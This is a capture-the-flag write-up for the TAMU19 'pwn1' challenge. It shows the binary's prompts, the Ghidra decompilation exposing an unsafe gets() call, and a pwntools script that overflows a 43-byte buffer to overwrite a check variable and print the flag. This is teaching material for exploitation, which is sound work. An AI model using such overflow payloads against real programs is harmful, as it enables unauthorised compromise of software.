# tamu19_pwn1

[Link to binary](https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tamu19_pwn1/pwn1)

---

```
~/Downloads > ./pwn1 
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
```

So it's another prompt. This time around, `strings` gives us useful info:

```
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
I don't know that! Auuuuuuuugh!
What... is your quest?
To seek the Holy Grail.
What... is my secret?
;*2$"
```

So it seems like there are actually three questions instead of just one. `strings` gives us the answers to the first two already.

```
~/Downloads > ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
```

We still don't know the secret. Ghidra to the rescue!

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  uint local_18;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(stdout,(char *)2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see."
      );
  puts("What... is your name?");
  fgets(local_43,43,stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,43,stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == 0xdea110c8) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

This is very similar to the previous challenge: `gets` reads bytes into `local_43` until it encounters a newline. So we can simply fill the buffer with 43 random bytes and then overflow into `local_18`.

```python
from pwn import *

p = process("./pwn1")

p.sendline("Sir Lancelot of Camelot")
p.sendline("To seek the Holy Grail.")
p.sendline(43 * b" " + bytes.fromhex("dea110c8")[::-1])
print(p.recvall().decode())
```

```
~/Downloads > python pwn_pwn1.py 
[+] Starting local process './pwn1': pid 21515
[+] Receiving all data: Done (204B)
[*] Process './pwn1' stopped with exit code 0 (pid 21515)
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
Dear{pwn1}
```

The binary reads a `flag.txt` because this binary was supposed to run on a
server and serve the prompt on a TCP tunnel. I created a fake `flag.txt` to
replicate the behaviour.
